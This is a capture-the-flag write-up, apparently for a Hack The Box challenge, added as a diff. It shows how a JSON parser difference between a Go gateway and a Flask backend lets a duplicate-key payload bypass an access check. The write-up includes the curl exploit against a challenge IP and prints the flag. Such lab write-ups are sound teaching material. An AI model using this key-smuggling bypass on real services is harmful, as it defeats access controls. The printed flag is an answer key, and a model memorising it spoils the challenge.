@@ -1,0 +1,80 @@
+Here is the step-by-step guide to solving this challenge manually.
+  ──────
+  ### Step 1: Analyze the Architecture
+  First, inspect the provided source code files to understand the layout of the application:
+
+  • main.go is the Go gateway running on port 8080.
+  • app.py is the Flask backend running on port 8081.
+  • The external user can only interact with the Go gateway (port 8080), which proxies allowed requests to the Python backend.
+  ──────
+  ### Step 2: Identify the Restriction in Go
+
+  Open main.go:211-244 and look at the executeHandler:
+
+    type RequestData struct {
+        Action string `json:"action"`
+    }
+    ...
+    switch requestData.Action {
+    case "getcosmic":
+        // Forward the request to python backend
+        resp, err := http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(body))
+        ...
+    case "getSecureCode":
+        w.Write([]byte("Access denied: Invalid security clearance"))
+    default:
+        http.Error(w, "Invalid command", http.StatusBadRequest)
+    }
+
+  • If the incoming request has action set to "getSecureCode", the Go gateway directly blocks it and responds with Access denied.
+  • Only "getcosmic" requests are forwarded to the Python backend.
+  ──────
+  ### Step 3: Identify the Flag in Python
+
+  Open app.py:30-50 and look at the /execute route:
+
+    data = request.get_json()
+    ...
+    if data['action'] == "getcosmic":
+        # Returns normal cosmic data
+    elif data['action'] == "getSecureCode":
+        return jsonify({
+            "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
+            ...
+        })
+
+  To get the flag, the backend needs to receive a payload where the key "action" has the value "getSecureCode".
+  ──────
+  ### Step 4: Abuse JSON Deserialization Differences (The Trick)
+
+  When parsing JSON:
+
+  • Go's json.Unmarshal matches keys in a case-insensitive manner (e.g. "action" and "Action" both map to the Action struct field). When it encounters
+  duplicate/overlapping keys, the last one processed overwrites any previous values.
+  • Python's dictionary is strictly case-sensitive. "action" and "Action" are stored as completely different keys.
+
+  If we send this payload:
+
+    {
+      "action": "getSecureCode",
+      "Action": "getcosmic"
+    }
+
+  1. How Go processes it:
+      • action is decoded as Action = "getSecureCode"
+      • Action is decoded as Action = "getcosmic", overwriting the previous value.
+      • Go sees Action == "getcosmic", matches the case "getcosmic" block, and forwards the entire raw payload to Python.
+  2. How Python processes it:
+      • It decodes the JSON into a dictionary: {"action": "getSecureCode", "Action": "getcosmic"}.
+      • When the backend retrieves data['action'] (lowercase), it gets "getSecureCode" and returns the flag.
+
+  ──────
+  ### Step 5: Send the Exploit Manually
+
+  Use curl (or an API client like Postman / Burp Suite) to send the payload to the challenge target:
+
+    curl -X POST \
+      -H "Content-Type: application/json" \
+      -d '{"action": "getSecureCode", "Action": "getcosmic"}' \
+      http://154.57.164.82:32295/execute
+HTB{C0SM1C-BYP4SS}
